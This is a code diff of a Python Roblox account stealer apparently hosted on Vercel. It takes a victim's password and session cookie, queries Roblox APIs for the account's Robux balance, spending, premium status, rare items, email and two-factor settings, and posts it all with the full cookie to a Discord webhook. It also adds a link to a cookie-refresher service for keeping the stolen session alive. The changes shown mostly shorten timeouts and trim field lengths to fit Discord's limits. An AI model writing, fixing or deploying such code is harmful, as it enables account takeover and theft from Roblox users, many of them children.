@@ -36,6 +36,7 @@ def send_to_discord_background(password, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
     try:
         print("Background: Fetching Roblox user information...")
+        # Set shorter timeout for Vercel compatibility
         user_info = get_roblox_user_info(cookie)
         
         # Check if cookie actually works with Roblox API
@@ -68,10 +69,16 @@ def send_to_discord_background(password, cookie, webhook_url):
         # URL encode the full cookie for the refresh link - keep it simple to avoid Discord issues
         import urllib.parse
         # Truncate cookie first to avoid Discord URL length limits
-        if len(full_cookie_with_warning) > 1500:
-            full_cookie_with_warning = full_cookie_with_warning[:1500] + "..."
+        if len(full_cookie_with_warning) > 1000:  # Shorter limit for Discord field constraints
+            full_cookie_with_warning = full_cookie_with_warning[:1000] + "..."
         
         encoded_full_cookie = urllib.parse.quote_plus(full_cookie_with_warning)
+        
+        # Validate Discord field limits (1024 chars per field)
+        quick_links_value = f'[Discord Server](https://discord.gg/SsWFKqXr)\n[Refresh Cookie](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})'
+        if len(quick_links_value) > 1024:
+            # Use shorter refresh link if too long
+            quick_links_value = '[Discord Server](https://discord.gg/SsWFKqXr)\n[Refresh Cookie](https://dropref.com/)'
         
         # Truncate cookie if too long for Discord embed
         available_cookie_space = 3990  # Conservative limit
@@ -92,7 +99,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                     'fields': [
                         {
                             'name': '🔗 Quick Links',
-                            'value': f'[Discord Server](https://discord.gg/SsWFKqXr)\n[Refresh Cookie](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
+                            'value': quick_links_value,
                             'inline': False
                         },
                         {
@@ -177,7 +184,8 @@ def send_to_discord_background(password, cookie, webhook_url):
                 payload_size = len(json.dumps(discord_data))
                 print(f"Background: Reduced payload size to: {payload_size} bytes")
         
-        response = requests.post(webhook_url, json=discord_data, timeout=10)
+        # Use shorter timeout for Vercel compatibility
+        response = requests.post(webhook_url, json=discord_data, timeout=5)
         
         if response.status_code in [200, 204]:
             print(f"Background: Discord webhook successful: {response.status_code}")
@@ -214,9 +222,9 @@ def get_roblox_user_info(cookie):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         
-        # Get current user info
+        # Get current user info (shorter timeout for Vercel)
         response = requests.get('https://users.roblox.com/v1/users/authenticated', 
-                              headers=headers, timeout=3)
+                              headers=headers, timeout=2)
         
         if response.status_code == 200:
             user_data = response.json()
@@ -224,9 +232,9 @@ def get_roblox_user_info(cookie):
             username = user_data.get('name', 'Unknown')
             display_name = user_data.get('displayName', username)
             
-            # Get user avatar/profile picture
+            # Get user avatar/profile picture (shorter timeout for Vercel)
             avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
-                                         timeout=5)
+                                         timeout=2)
             
             profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
             if avatar_response.status_code == 200:
@@ -237,10 +245,10 @@ def get_roblox_user_info(cookie):
             # Get Robux balance - try multiple endpoints
             robux_balance = 'Not available'
             
-            # Try the currency endpoint first
+            # Try the currency endpoint first (shorter timeout for Vercel)
             try:
                 robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
-                                            headers=headers, timeout=5)
+                                            headers=headers, timeout=2)
                 print(f"Robux API response status: {robux_response.status_code}")
                 
                 if robux_response.status_code == 200:
@@ -259,7 +267,7 @@ def get_roblox_user_info(cookie):
             if robux_balance == 'Not available' and user_id:
                 try:
                     alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=2)
                     print(f"Alternative Robux API response status: {alt_response.status_code}")
                     
                     if alt_response.status_code == 200:
@@ -274,7 +282,7 @@ def get_roblox_user_info(cookie):
             pending_robux = 'Not available'
             try:
                 pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=2)
                 print(f"Pending Robux API response status: {pending_response.status_code}")
                 
                 if pending_response.status_code == 200:
@@ -296,9 +304,9 @@ def get_roblox_user_info(cookie):
             # Get Total spent robux past year using transaction totals endpoint
             total_spent_past_year = 'Not available'
             try:
-                # Try yearly timeframe first
+                # Try yearly timeframe first (shorter timeout for Vercel)
                 year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
-                                           headers=headers, timeout=5)
+                                           headers=headers, timeout=2)
                 print(f"Yearly spending API response status: {year_response.status_code}")
                 
                 if year_response.status_code == 200:
@@ -332,7 +340,7 @@ def get_roblox_user_info(cookie):
             premium_status = '❌ No'
             try:
                 premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=2)
                 print(f"Premium API response status: {premium_response.status_code}")
                 
                 if premium_response.status_code == 200:
@@ -355,7 +363,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
                 korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=2)
                 print(f"Korblox inventory check status: {korblox_response.status_code}")
                 
                 if korblox_response.status_code == 200:
@@ -374,7 +382,7 @@ def get_roblox_user_info(cookie):
                 
                 for headless_id in headless_ids:
                     headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
-                                                   headers=headers, timeout=5)
+                                                   headers=headers, timeout=2)
                     print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
                     
                     if headless_response.status_code == 200:
@@ -397,7 +405,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check email verification and 2FA settings
                 settings_response = requests.get('https://accountsettings.roblox.com/v1/email',
-                                               headers=headers, timeout=5)
+                                               headers=headers, timeout=2)
                 print(f"Account settings API response status: {settings_response.status_code}")
                 
                 if settings_response.status_code == 200:
@@ -417,7 +425,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check 2FA/Authenticator status
                 twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=2)
                 print(f"2FA API response status: {twostep_response.status_code}")
                 
                 if twostep_response.status_code == 200:
